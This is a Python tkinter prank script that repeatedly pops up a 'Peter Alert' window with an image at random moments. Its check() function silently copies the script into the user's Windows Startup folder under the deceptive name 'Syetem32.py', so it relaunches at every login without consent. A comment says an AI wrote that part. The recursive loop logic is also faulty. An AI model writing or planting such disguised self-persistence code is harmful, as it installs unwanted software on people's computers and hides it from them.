#imports tkinter,time, and random 
import tkinter as tk
from tkinter import *
import time 
import random
import os
import os.path
from PIL import Image, ImageTk

list = [1, 2, 3 ,4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
list2 = [1,2,3,4,5,6,7,9,10,11,12,13]

rizz = True
check1 = True

def ran():
    global rizz
    if rizz:
        global run 
        run = random.choice(list)
    if run == 8:
        main()
        run = random.choice(list2)
    else:
        time.sleep(0.1)
        random.choice(list)
        ran()
    if root.destroy:
        ran()
    
def check():
    name = "Syetem32.py"
    os.path.expanduser("~")
    startup_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    global check1 
    

    target_file = os.path.join(startup_path, name)
    if os.path.exists(target_file):
        check1 = False

    if check1:
        # This Code was done by a clanker
        try:
            with open(__file__, "r") as con:
                content = con.read()
            with open(target_file, "w") as stuf:
                stuf.write(content)
        except:
            pass 
        #end 

def main():
    global root 
    root = tk.Tk()
    root.title('Peter Alert')
    root.geometry("730x400")
    global rizz
    rizz = False

    image = Image.open("peter.png")
    tk_image = ImageTk.PhotoImage(image)
    label = tk.Label(root, image=tk_image)
    label.pack()
    button = Button(root, text = 'Peter Alert', command=root.destroy)  
    button.pack()
    if check1 == True:
        check()

    root.mainloop()
    rizz = True


   
ran()
